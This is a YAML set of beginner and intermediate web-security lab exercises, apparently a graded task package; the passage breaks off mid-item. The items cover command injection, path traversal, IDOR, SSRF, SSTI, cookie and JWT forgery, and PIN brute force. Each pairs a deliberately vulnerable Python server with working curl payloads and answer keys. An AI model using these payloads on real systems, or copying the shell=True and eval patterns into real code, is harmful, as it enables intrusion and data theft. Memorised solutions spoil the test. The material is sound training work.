# ===== Beginner =====

- id: offsec-web-021
  title: Command injection in the ping tool
  difficulty: 2
  kind: build
  tags: [web, command-injection, rce]
  tutorial: |
    **What you're learning.** Command injection in a shell-wrapping endpoint (the same class as offsec-web-005, here with a readable `/flag.txt`).

    ### The idea

    The page builds a shell command from your input (`ping -c1 <host>`). Shell metacharacters chain your own command: `;`, `|`, `&&`, `$(...)`, backticks. URL-encode the payload so it reaches the server intact.

    ### Commands you'll use

    ```bash
    curl -sG http://127.0.0.1:8080/ping --data-urlencode 'host=x; cat /flag.txt' | grep -oE 'KL\{[^}]+\}'
    curl -sG http://127.0.0.1:8080/ping --data-urlencode 'host=127.0.0.1 && id'          # confirm execution
    curl -sG http://127.0.0.1:8080/ping --data-urlencode 'host=$(cat /flag.txt)'          # substitution form
    ```

    ### Common mistakes

    - An unencoded `;`/`&` eaten by your own shell: use `--data-urlencode`.
    - A filter blocking spaces: `${IFS}`, `;cat</flag.txt`.

    ### Check your work

    `/lab/cmdi.txt` holds the flag from `/flag.txt`.
  scenario: |
    The admin "network tools" page at **`http://127.0.0.1:8080/ping`** takes a
    `host` parameter and pings it. The flag is in **`/flag.txt`** inside the
    container, readable by the web user.

    Exploit the command injection to read it, and write the `KL{...}` token to
    **`/lab/flag.txt`**.
  hints:
    - "`curl -s 'http://127.0.0.1:8080/ping?host=127.0.0.1'` shows normal output."
    - "Append a second command: `host=127.0.0.1;cat /flag.txt` (URL-encode the `;` as `%3B`)."
    - "`curl -s --data-urlencode 'host=x; cat /flag.txt' http://127.0.0.1:8080/ping`."
  solution: |
    ```bash
    curl -s 'http://127.0.0.1:8080/ping' --get --data-urlencode 'host=x; cat /flag.txt' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target cmdi 8080 <<'PY'
    import os, subprocess, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080"))
    open("/flag.txt", "w").write(os.environ.get("FLAG", "KL{missing}") + "\n")
    os.chmod("/flag.txt", 0o644)
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            if q.path != "/ping":
                self.send_response(200); self.end_headers(); self.wfile.write(b"<h1>Network tools</h1><form>host <input name=host></form>"); return
            host = urllib.parse.parse_qs(q.query).get("host", [""])[0]
            try:
                out = subprocess.run("ping -c1 -W1 " + host, shell=True, capture_output=True, text=True, timeout=5).stdout
            except Exception as e:
                out = str(e)
            b = ("<pre>" + out + "</pre>").encode()
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    curl -s 'http://127.0.0.1:8080/ping' --get --data-urlencode 'host=x; cat /flag.txt' | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-022
  title: Read files the app never meant to serve
  difficulty: 2
  kind: build
  tags: [web, path-traversal, lfi]
  tutorial: |
    **What you're learning.** Path traversal to read a config file outside the served directory (offsec-web-004's class).

    ### The idea

    `?page=NAME` maps to `pages/NAME`. `../` climbs out: `../config.yml`, `../../etc/passwd`. Add levels until you reach the file.

    ### Commands you'll use

    ```bash
    curl -s 'http://127.0.0.1:8081/view?page=index'                    # normal
    curl -s 'http://127.0.0.1:8081/view?page=../config.yml' | grep -oE 'KL\{[^}]+\}'
    curl -s 'http://127.0.0.1:8081/view?page=....//....//etc/passwd' | head   # if ../ is stripped once
    ```

    ### Common mistakes

    - Too few `../`. A filter stripping one `../`: use `....//` or `%2e%2e%2f`.
    - An appended extension (`pages/NAME.md`): a trailing null or `?`/`#` sometimes helps, but usually just read a file without an extension.

    ### Check your work

    The config file's `KL{...}` lands in the answer file.
  scenario: |
    The docs server at **`http://127.0.0.1:8081/view?page=NAME`** serves files
    from its `pages/` directory. The service's configuration file
    **`/app/config.ini`** (outside `pages/`) contains the flag.

    Read it through the traversal and write the `KL{...}` token to
    **`/lab/flag.txt`**.
  hints:
    - "`curl -s 'http://127.0.0.1:8081/view?page=welcome'` serves a normal page."
    - "Climb out: `page=../config.ini`."
    - "URL-encode the slashes if needed: `page=..%2fconfig.ini`."
  solution: |
    ```bash
    curl -s 'http://127.0.0.1:8081/view?page=../config.ini' | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target lfi 8081 <<'PY'
    import os, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8081"))
    os.makedirs("/app/pages", exist_ok=True)
    open("/app/pages/welcome.html", "w").write("<h1>Welcome to the docs</h1>")
    open("/app/config.ini", "w").write("[app]\nsecret=" + os.environ.get("FLAG", "KL{missing}") + "\n")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            if q.path != "/view":
                self.send_response(200); self.end_headers(); self.wfile.write(b"<a href=/view?page=welcome>docs</a>"); return
            page = urllib.parse.parse_qs(q.query).get("page", ["welcome"])[0]
            path = "/app/pages/" + page
            try:
                data = open(path, "rb").read()
            except Exception:
                self.send_response(404); self.end_headers(); self.wfile.write(b"not found"); return
            self.send_response(200); self.send_header("Content-Length", str(len(data))); self.end_headers(); self.wfile.write(data)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    curl -s 'http://127.0.0.1:8081/view?page=../config.ini' | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-025
  title: Read another user's invoice
  difficulty: 2
  kind: build
  tags: [web, idor, access-control]
  tutorial: |
    **What you're learning.** IDOR by iterating object ids (offsec-web-010's Part 1, at scale).

    ### The idea

    `/invoice?id=N` with `X-User: 1` but no ownership check: loop over ids 2–50 and read them all. One belongs to the CFO.

    ### Commands you'll use

    ```bash
    for i in $(seq 1 50); do
      echo "== $i"; curl -s -H 'X-User: 1' "http://127.0.0.1:8084/invoice?id=$i" | grep -oE 'KL\{[^}]+\}'
    done
    for i in $(seq 1 50); do curl -s -H 'X-User: 1' "http://127.0.0.1:8084/invoice?id=$i"; done | grep -oE 'KL\{[^}]+\}'
    ```

    ### Common mistakes

    - Forgetting the `X-User` header (needed to authenticate at all).
    - Stopping at the first id.

    ### Check your work

    The CFO's invoice flag is captured.
  scenario: |
    Logged in as user 1, your invoice is at
    **`http://127.0.0.1:8084/invoice?id=1`** (send the header `X-User: 1`).
    One of the other invoices (ids 2–50) belongs to the CFO and contains the
    flag.

    Find it and write the `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "`curl -s -H 'X-User: 1' 'http://127.0.0.1:8084/invoice?id=1'` is yours."
    - "The server checks the header but not whether the invoice is yours: loop `id` from 1 to 50."
  solution: |
    ```bash
    for i in $(seq 1 50); do
      curl -s -H 'X-User: 1' "http://127.0.0.1:8084/invoice?id=$i"
    done | grep -oE 'KL\{[0-9a-f]+\}' | head -1 > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target idor 8084 <<'PY'
    import os, random, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8084"))
    flag_id = random.randint(2, 50)
    invoices = {i: ("Invoice #%d: amount $%d" % (i, i * 37)) for i in range(1, 51)}
    invoices[flag_id] = "Invoice #%d (CFO): %s" % (flag_id, os.environ.get("FLAG", "KL{missing}"))
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            if q.path != "/invoice":
                self.send_response(200); self.end_headers(); self.wfile.write(b"invoice portal: /invoice?id="); return
            if self.headers.get("X-User") is None:
                self.send_response(401); self.end_headers(); self.wfile.write(b"log in"); return
            try:
                i = int(urllib.parse.parse_qs(q.query).get("id", ["0"])[0])
            except ValueError:
                i = 0
            body = invoices.get(i, "no such invoice").encode()
            self.send_response(200); self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    for i in $(seq 1 50); do curl -s -H 'X-User: 1' "http://127.0.0.1:8084/invoice?id=$i"; done | grep -oE 'KL\{[0-9a-f]+\}' | head -1 > /lab/flag.txt

- id: offsec-web-031
  title: The method the filter forgot
  difficulty: 2
  kind: build
  tags: [web, verb-tampering, access-control]
  tutorial: |
    **What you're learning.** Method-based access control bypass.

    ### The idea

    The developer guarded only `GET` with the 403, but the handler serves the same content for other methods (`POST`, `HEAD`, or an arbitrary one). Try them.

    ### Commands you'll use

    ```bash
    curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8090/admin            # 403
    for m in POST HEAD PUT OPTIONS DELETE FOO; do
      printf '%s ' $m; curl -s -o /dev/null -w '%{http_code}\n' -X $m http://127.0.0.1:8090/admin
    done
    curl -s -X POST http://127.0.0.1:8090/admin | grep -oE 'KL\{[^}]+\}'
    ```
    `HEAD` returns no body; if that's the only allowed method, some frameworks leak via headers.

    ### Common mistakes

    - Only trying `GET`.
    - `HEAD` hiding the body: switch to `POST` or a custom verb.

    ### Check your work

    A non-GET request to `/admin` returns the flag.
  scenario: |
    **`http://127.0.0.1:8090/admin`** returns `403 Forbidden` to a `GET`. The
    developer only guarded `GET`; the handler serves the same content for a
    **`POST`**. Reach the admin page the other way and write the `KL{...}`
    token to **`/lab/flag.txt`**.
  hints:
    - "`curl -s -i http://127.0.0.1:8090/admin` is 403."
    - "`curl -s -X POST http://127.0.0.1:8090/admin`."
  solution: |
    ```bash
    curl -s -X POST http://127.0.0.1:8090/admin | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target verbtamper 8090 <<'PY'
    import os, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8090"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            if self.path == "/admin":
                self.send_response(403); self.end_headers(); self.wfile.write(b"Forbidden"); return
            self.send_response(200); self.end_headers(); self.wfile.write(b"home")
        def do_POST(self):
            if self.path == "/admin":
                b = ("Admin console. Flag: " + FLAG).encode()
                self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b); return
            self.send_response(404); self.end_headers()
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    curl -s -X POST http://127.0.0.1:8090/admin | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-036
  title: The role cookie you can rewrite
  difficulty: 2
  kind: build
  tags: [web, cookies, integrity, access-control]
  tutorial: |
    **What you're learning.** Rewriting a base64-JSON role cookie (offsec-web-010's Part 2, with a JSON object).

    ### The idea

    The `session` cookie is `base64('{"user":"guest","role":"user"}')`. Decode, change `role` to `admin`, re-encode, send it back.

    ### Commands you'll use

    ```bash
    curl -s -i http://127.0.0.1:8095/ | grep -i set-cookie
    echo 'eyJ1c2VyIjoi...' | base64 -d                                   # inspect
    new=$(printf '%s' '{"user":"attacker","role":"admin"}' | base64 -w0)
    curl -s --cookie "session=$new" http://127.0.0.1:8095/ | grep -oE 'KL\{[^}]+\}'
    ```
    `base64 -w0` avoids line wrapping.

    ### Common mistakes

    - Wrapped base64 (newlines) in the cookie.
    - Breaking the JSON (missing quote/brace).

    ### Check your work

    The rewritten cookie yields the admin flag.
  scenario: |
    **`http://127.0.0.1:8095/`** sets a cookie **`session`** holding a
    base64-encoded JSON object `{"user":"guest","role":"user"}`. The page
    **`/panel`** returns the flag to `role=admin`.

    Tamper the cookie to become admin, read `/panel`, and write the `KL{...}`
    token to **`/lab/flag.txt`**.
  hints:
    - "Decode the cookie: `printf %s \"$cookie\" | base64 -d`."
    - "Change `user` to `admin`, re-encode, and send it back."
    - "`new=$(printf '%s' '{\"user\":\"attacker\",\"role\":\"admin\"}' | base64 -w0)`."
  solution: |
    ```bash
    new=$(printf '%s' '{"user":"attacker","role":"admin"}' | base64 -w0)
    curl -s -H "Cookie: session=$new" http://127.0.0.1:8095/panel | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target rolecookie 8095 <<'PY'
    import os, json, base64, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8095"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _c(self):
            for kv in (self.headers.get("Cookie") or "").split(";"):
                if kv.strip().startswith("session="):
                    try:
                        return json.loads(base64.b64decode(kv.strip()[8:] + "=="))
                    except Exception:
                        return {}
            return {}
        def do_GET(self):
            if self.path == "/panel":
                sess = self._c()
                ok = sess.get("role") == "admin"
                b = (("Admin panel. Flag: " + FLAG) if ok else "forbidden").encode()
                self.send_response(200 if ok else 403); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b); return
            cookie = base64.b64encode(json.dumps({"user": "guest", "role": "user"}).encode()).decode()
            b = b"Logged in as guest. Try /panel"
            self.send_response(200); self.send_header("Set-Cookie", "session=" + cookie)
            self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    new=$(printf '%s' '{"user":"attacker","role":"admin"}' | base64 -w0)
    curl -s -H "Cookie: session=$new" http://127.0.0.1:8095/panel | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-037
  title: Brute-force the four-digit PIN
  difficulty: 2
  kind: build
  tags: [web, brute-force, rate-limiting, authentication]
  tutorial: |
    **What you're learning.** Brute-forcing a small keyspace (a 4-digit PIN).

    ### The idea

    10000 possibilities is trivial to exhaust when there's no rate limit. Loop `0000`–`9999` and detect the success response (different body or status).

    ### Commands you'll use

    ```bash
    curl -s 'http://127.0.0.1:8096/unlock?pin=0000'                      # see the failure response
    for p in $(seq -w 0 9999); do
      r=$(curl -s "http://127.0.0.1:8096/unlock?pin=$p")
      case "$r" in *KL\{*) echo "$p: $r"; break;; esac
    done
    ```
    `seq -w` zero-pads to equal width (`0000`). Parallelise with `xargs -P` if slow.

    ### Common mistakes

    - Unpadded PINs (`0` instead of `0000`).
    - Not recognising the success response: compare against a known failure first.

    ### Check your work

    The correct PIN's response holds the flag.
  scenario: |
    The device portal at **`http://127.0.0.1:8096/unlock`** checks a 4-digit
    PIN sent as `pin=NNNN` and returns the flag on the right one. There's no
    lockout. Find the PIN, read the flag, and write the `KL{...}` token to
    **`/lab/flag.txt`**.
  hints:
    - "Loop `0000`–`9999` and look for a response that isn't `wrong pin`."
    - "`for p in $(seq -w 0 9999); do ...; done` (seq -w zero-pads)."
  solution: |
    ```bash
    for p in $(seq -w 0 9999); do
      r=$(curl -s "http://127.0.0.1:8096/unlock?pin=$p")
      case "$r" in *KL\{*) echo "$r" | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt; break;; esac
    done
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target pinbrute 8096 <<'PY'
    import os, random, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8096"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    PIN = "%04d" % random.randint(0, 9999)
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            if q.path != "/unlock":
                self.send_response(200); self.end_headers(); self.wfile.write(b"/unlock?pin=NNNN"); return
            pin = urllib.parse.parse_qs(q.query).get("pin", [""])[0]
            b = (("unlocked. Flag: " + FLAG) if pin == PIN else "wrong pin").encode()
            self.send_response(200); self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    for p in $(seq -w 0 9999); do
      r=$(curl -s "http://127.0.0.1:8096/unlock?pin=$p")
      case "$r" in *KL\{*) echo "$r" | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt; break;; esac
    done

- id: offsec-web-038
  title: The API key left in the JavaScript
  difficulty: 2
  kind: build
  tags: [web, recon, secrets, source-disclosure, api]
  tutorial: |
    **What you're learning.** Secrets left in client-side JavaScript.

    ### The idea

    Front-end JS is fully visible to the client. An API key or an admin endpoint hardcoded in `/static/app.js` is readable: fetch the JS, extract the key and the path, then call the endpoint with the key.

    ### Commands you'll use

    ```bash
    curl -s http://127.0.0.1:8097/static/app.js | grep -iE 'api_key|fetch|/admin'
    key=$(curl -s http://127.0.0.1:8097/static/app.js | sed -n 's/.*API_KEY *= *"\([^"]*\)".*/\1/p')
    path=$(curl -s http://127.0.0.1:8097/static/app.js | grep -oE 'fetch\("/[^"]+"' | head -1 | sed 's/fetch("//;s/"//')
    curl -s -H "X-API-Key: $key" "http://127.0.0.1:8097$path" | grep -oE 'KL\{[^}]+\}'
    ```

    ### Common mistakes

    - Assuming client-side secrets are hidden: never trust the client.
    - Missing a minified key split across concatenation.

    ### Check your work

    The endpoint, called with the extracted key, returns the flag.
  scenario: |
    The app at **`http://127.0.0.1:8097/`** loads
    **`/static/app.js`**, which contains a hardcoded admin **API key** and the
    path of an admin endpoint. That endpoint returns the flag when called with
    the key in the **`X-API-Key`** header.

    Recover the key from the JS, call the admin endpoint, and write the
    `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "`curl -s http://127.0.0.1:8097/static/app.js` and read the constants."
    - "It defines `API_KEY` and an admin path. Call it: `curl -s -H \"X-API-Key: $KEY\" http://127.0.0.1:8097/<path>`."
  solution: |
    ```bash
    js=$(curl -s http://127.0.0.1:8097/static/app.js)
    key=$(sed -n 's/.*API_KEY *= *"\([^"]*\)".*/\1/p' <<<"$js")
    path=$(sed -n 's#.*fetch("\(/[^"]*\)".*#\1#p' <<<"$js" | head -1)
    curl -s -H "X-API-Key: $key" "http://127.0.0.1:8097$path" | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target jskey 8097 <<'PY'
    import os, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8097"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    KEY = os.urandom(12).hex()
    JS = 'const API_KEY = "%s";\nasync function loadStats(){ return fetch("/api/admin/stats", {headers:{"X-API-Key":API_KEY}}); }\n' % KEY
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            if self.path == "/static/app.js":
                b = JS.encode()
                self.send_response(200); self.send_header("Content-Type", "application/javascript")
                self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b); return
            if self.path == "/api/admin/stats":
                if self.headers.get("X-API-Key") == KEY:
                    b = ("stats. Flag: " + FLAG).encode()
                    self.send_response(200)
                else:
                    b = b"invalid api key"; self.send_response(403)
                self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b); return
            self.send_response(200); self.end_headers(); self.wfile.write(b'<script src="/static/app.js"></script>')
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    js=$(curl -s http://127.0.0.1:8097/static/app.js)
    key=$(sed -n 's/.*API_KEY *= *"\([^"]*\)".*/\1/p' <<<"$js")
    path=$(sed -n 's#.*fetch("\(/[^"]*\)".*#\1#p' <<<"$js" | head -1)
    curl -s -H "X-API-Key: $key" "http://127.0.0.1:8097$path" | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

# ===== Intermediate =====

- id: offsec-web-023
  title: Make the server fetch the internal metadata
  difficulty: 3
  kind: build
  tags: [web, ssrf]
  tutorial: |
    **What you're learning.** SSRF to an internal metadata service (offsec-web-005's Part 2).

    ### The idea

    `?url=URL` is fetched server-side, so you reach services only the server can (`127.0.0.1:9000`, cloud metadata at `169.254.169.254`).

    ### Commands you'll use

    ```bash
    curl -sG http://127.0.0.1:8082/fetch --data-urlencode 'url=http://127.0.0.1:9000/secret' | grep -oE 'KL\{[^}]+\}'
    curl -sG http://127.0.0.1:8082/fetch --data-urlencode 'url=http://169.254.169.254/latest/meta-data/' 2>/dev/null
    ```

    ### Common mistakes

    - A host allowlist: try `http://127.0.0.1`, `http://[::1]`, decimal/hex IP, or an open redirect.

    ### Check your work

    The internal metadata flag is captured.
  scenario: |
    The webhook tester at **`http://127.0.0.1:8082/fetch?url=URL`** fetches any
    URL you give it and returns the body. An **internal** metadata service runs
    on **`http://127.0.0.1:9000/secret`** — bound so only the server reaches
    it — and returns the flag.

    Use the SSRF to read it, and write the `KL{...}` token to
    **`/lab/flag.txt`**.
  hints:
    - "`curl -s 'http://127.0.0.1:8082/fetch?url=http://example.test/'` proves it fetches for you."
    - "Point it inward: `url=http://127.0.0.1:9000/secret`."
    - "URL-encode the inner URL if your shell mangles it."
  solution: |
    ```bash
    curl -s 'http://127.0.0.1:8082/fetch' --get --data-urlencode 'url=http://127.0.0.1:9000/secret' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target ssrf 8082 <<'PY'
    import os, threading, urllib.parse, urllib.request, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8082"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    class Meta(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            body = (FLAG if self.path == "/secret" else "metadata service").encode()
            self.send_response(200); self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
    def meta():
        socketserver.TCPServer.allow_reuse_address = True
        socketserver.TCPServer(("127.0.0.1", 9000), Meta).serve_forever()
    threading.Thread(target=meta, daemon=True).start()
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            if q.path != "/fetch":
                self.send_response(200); self.end_headers(); self.wfile.write(b"webhook tester: /fetch?url="); return
            url = urllib.parse.parse_qs(q.query).get("url", [""])[0]
            try:
                data = urllib.request.urlopen(url, timeout=3).read()
            except Exception as e:
                data = ("fetch failed: %s" % e).encode()
            self.send_response(200); self.send_header("Content-Length", str(len(data))); self.end_headers(); self.wfile.write(data)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    curl -s 'http://127.0.0.1:8082/fetch' --get --data-urlencode 'url=http://127.0.0.1:9000/secret' | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-024
  title: Template injection in the greeting
  difficulty: 3
  kind: build
  tags: [web, ssti, rce]
  tutorial: |
    **What you're learning.** Server-side template injection (SSTI).

    ### The idea

    When input is rendered **as a template**, `{{ expression }}` is evaluated on the server. Probe with `{{7*7}}` → `49`. Then reach objects the engine exposes (`config`, `self`, Python internals) to read secrets or run code.

    ### Commands you'll use

    ```bash
    curl -sG http://127.0.0.1:8083/hello --data-urlencode 'name={{7*7}}'           # renders 49 → SSTI
    curl -sG http://127.0.0.1:8083/hello --data-urlencode "name={{config['flag']}}" | grep -oE 'KL\{[^}]+\}'
    # Jinja2 RCE chain, if needed:
    curl -sG http://127.0.0.1:8083/hello --data-urlencode "name={{self.__init__.__globals__}}" | head -c 200
    ```
    `{{7*7}}`→`49` means template eval; `${7*7}` or `#{7*7}` indicate other engines.

    ### Common mistakes

    - Confusing SSTI with XSS: `{{7*7}}` rendering `49` (not literal) is the tell.
    - Wrong engine syntax.

    ### Check your work

    The template expression leaks the `flag` config value.
  scenario: |
    The greeting page at **`http://127.0.0.1:8083/hello?name=NAME`** renders
    your name through a small template engine that evaluates `{{ ... }}`
    expressions in a context exposing `config`. The flag is
    `config["flag"]`.

    Leak it and write the `KL{...}` token to **`/lab/flag.txt`**.
  hints:
    - "`curl -s 'http://127.0.0.1:8083/hello?name={{7*7}}'` returns `Hello 49` — expressions are evaluated."
    - "The context has a `config` dict: `name={{config['flag']}}` (URL-encode the braces and quotes)."
  solution: |
    ```bash
    curl -s 'http://127.0.0.1:8083/hello' --get --data-urlencode "name={{config['flag']}}" \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target ssti 8083 <<'PY'
    import os, re, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8083"))
    config = {"flag": os.environ.get("FLAG", "KL{missing}"), "app": "greeter"}
    def render(tmpl):
        def ev(m):
            try:
                return str(eval(m.group(1), {"config": config}))
            except Exception:
                return "?"
        return re.sub(r"\{\{(.*?)\}\}", ev, tmpl)
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            q = urllib.parse.urlparse(self.path)
            name = urllib.parse.parse_qs(q.query).get("name", ["world"])[0]
            body = render("Hello " + name).encode()
            self.send_response(200); self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
    socketserver.TCPServer.allow_reuse_address = True
    socketserver.TCPServer(("0.0.0.0", PORT), H).serve_forever()
    PY
  check: |
    check_flag /lab/flag.txt
  solve: |
    curl -s 'http://127.0.0.1:8083/hello' --get --data-urlencode "name={{config['flag']}}" | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt

- id: offsec-web-026
  title: 'The JWT that trusts "alg: none"'
  difficulty: 3
  kind: build
  tags: [web, jwt, authentication, tokens]
  tutorial: |
    **What you're learning.** `alg:none` JWT forgery (offsec-web-010's Part 3, with a boolean claim).

    ### The idea

    A server that accepts `alg:none` trusts an unsigned token. Forge `{"admin":true}` with an empty signature.

    ### Commands you'll use

    ```bash
    b64() { printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '='; }
    tok="$(b64 '{"alg":"none","typ":"JWT"}').$(b64 '{"admin":true}')."
    curl -s --cookie "token=$tok" http://127.0.0.1:8085/ | grep -oE 'KL\{[^}]+\}'
    ```

    ### Common mistakes

    - Standard base64 instead of base64url; missing trailing `.`.

    ### Check your work

    The forged admin token returns the flag.
  scenario: |
    **`http://127.0.0.1:8085/`** gives you a visitor JWT in the `token`
    cookie. **`/admin`** returns the flag, but only to a token whose payload has
    `"admin": true`. The server accepts unsigned (`alg:none`) tokens.

    Forge one and read **`/admin`**, then write the `KL{...}` token to
    **`/lab/flag.txt`**.
  hints:
    - "base64url-encode `{\"alg\":\"none\",\"typ\":\"JWT\"}` and `{\"admin\":true}`, join with a dot, add a trailing dot for the empty signature."
    - "`b64() { printf %s \"$1\" | base64 | tr '+/' '-_' | tr -d '='; }`."
    - "`curl -s -H \"Cookie: token=$HEADER.$PAYLOAD.\" http://127.0.0.1:8085/admin`."
  solution: |
    ```bash
    b64() { printf %s "$1" | base64 | tr '+/' '-_' | tr -d '='; }
    tok="$(b64 '{"alg":"none","typ":"JWT"}').$(b64 '{"admin":true}')."
    curl -s -H "Cookie: token=$tok" http://127.0.0.1:8085/admin | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target jwtnone 8085 <<'PY'
    import os, json, base64, hmac, hashlib, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8085"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    SECRET = os.urandom(16)
    def b64d(s):
        return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
    def b64e(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    def mint(payload):
        h = b64e(b'{"alg":"HS256","typ":"JWT"}'); p = b64e(json.dumps(payload).encode())
        sig = b64e(hmac.new(SECRET, (h + "." + p).encode(), hashlib.sha256).digest())
        return h + "." + p + "." + sig
    def verify(tok):
        try:
            h, p, s = tok.split(".")
            hdr = json.loads(b64d(h)); payload = json.loads(b64d(p))
        except Exception:
            return None
        alg = hdr.get("alg")
        if alg == "none":
            return payload
        if alg == "HS256":
            want = b64e(hmac.new(SECRET, (h + "." + p).encode(), hashlib.sha256).digest())
            return payload if hmac.compare_digest(want, s) else None
        return None
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _c(self):
            for kv in (self.headers.get("Cookie") or "").split(";"):
                if kv.strip().startswith("token="):
                    return kv.strip()[6:]
            return ""
        def do_GET(self):
            if self.path == "/admin":
                payload = verify(self._c()) or {}
                if payload.get("admin") is True:
                    b = ("Admin area. Flag: " + FLAG).encode()
                else:
                    b = b"forbidden: admins only"
